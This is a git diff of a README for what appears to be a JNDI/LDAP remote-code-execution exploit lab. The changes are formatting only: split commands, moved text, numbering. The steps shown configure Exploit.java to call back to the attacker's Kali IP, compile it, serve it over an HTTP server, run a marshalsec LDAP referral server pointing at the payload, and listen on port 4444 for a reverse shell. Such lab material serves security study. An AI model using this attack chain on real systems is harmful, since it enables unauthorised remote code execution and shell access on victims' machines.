@@ -30,12 +30,14 @@ clone the git repo to your Kali VM
 ## Prepping Java File
 Edit the .java file to enter your local Kali machines IP
 ```bash
-cd attacker/exploit && sudo nano Exploit.java
+cd attacker
+cd exploit && sudo nano Exploit.java
 ```
+
+Once you have updated your java file to point to your Kali machine's IP, You need to compile it
 ```bash
 sudo apt install openjdk-11-jdk -y
 ```
-Once you have updated your java file to point to your Kali machine's IP, You need to compile it
 ```bash
 sudo javac -source 1.8 -target 1.8 Exploit.java
 ```
@@ -50,7 +52,7 @@ python3 -m http.server PORT
 In a seperate Terminal Tab/Window:
 **1.** Move to `ldap_server` folder and build the `pom.xml`
 
-Install Maven if required
+**1.** Install Maven if required
 ```bash
 sudo apt install maven -y
 ```
@@ -65,6 +67,7 @@ sudo mvn clean package -DskipTests
 java -cp ldap_server-1.0-all.jar marshalsec.jndi.LDAPRefServer "http://http_server_ip:http_server_port/#Exploit"
 ```
 ## Listen for callback
+
 In a seperate Terminal Tab/Window:
 **1.** Use the Listen back command on port 4444 to wait for a reverse shell
 ```bash
